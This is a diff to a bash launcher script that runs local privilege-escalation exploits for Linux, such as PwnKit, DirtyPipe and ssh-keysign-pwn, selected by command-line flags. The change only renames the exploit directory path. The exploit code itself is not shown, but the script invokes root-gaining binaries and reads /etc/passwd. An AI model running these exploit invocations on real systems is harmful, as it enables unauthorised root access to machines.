@@ -103,13 +103,13 @@ fi
 # PwnKit
 for arch in 64 32; do
      if [[ "$*" == "-PwnKit${arch}" ]]; then
-          "${PWD}/exploit/PwnKit/PwnKit${arch}"
+          "${PWD}/exploits/PwnKit/PwnKit${arch}"
      fi
 done
 
 # Overlays
 if [[ "$*" == "-Overlays" ]]; then
-     ${PWD}/exploit/Overlays/overlays
+     ${PWD}/exploits/Overlays/overlays
 fi
 
 # DirtyCow
@@ -121,7 +121,7 @@ fi
 
 # DirtyPipe
 if [[ "$*" == "-DirtyPipe" ]]; then
-     ${PWD}/exploit/DirtyPipe/dpipe --root
+     ${PWD}/exploits/DirtyPipe/dpipe --root
      cat /etc/passwd | grep root
 fi
 
@@ -132,30 +132,30 @@ fi
 
 # Copy-Fail
 if [[ "$*" == "-CFail" ]]; then
-     ${PWD}/exploit/CopyFail/copyfail
+     ${PWD}/exploits/CopyFail/copyfail
 fi
 
 # Pack2TheRoot 
 if [[ "$*" == "-PKroot" ]]; then
-     ${PWD}/exploit/Pack2TheRoot/pkroot.sh
+     ${PWD}/exploits/Pack2TheRoot/pkroot.sh
 fi
 
 # DirtyFrag
 if [[ "$*" == "-DirtyFrag" ]]; then
-     ${PWD}/exploit/DirtyFrag/dirtyfrag
+     ${PWD}/exploits/DirtyFrag/dirtyfrag
 fi
 
 # Fragnesia
 if [[ "$*" == "-Fragnesia" ]]; then
-     ${PWD}/exploit/Fragnesia/fragnesia
+     ${PWD}/exploits/Fragnesia/fragnesia
 fi
 
 # ssh-keysign-pwn
 if [[ "$*" == "-SKP" ]]; then
-     ${PWD}/exploit/ssh-keysign-pwn/skp /usr/bin/su
+     ${PWD}/exploits/ssh-keysign-pwn/skp /usr/bin/su
 fi
 
 # PeditCow
 if [[ "$*" == "-PeditCow" ]]; then
-     ${PWD}/exploit/PeditCow/a.out
+     ${PWD}/exploits/PeditCow/a.out
 fi
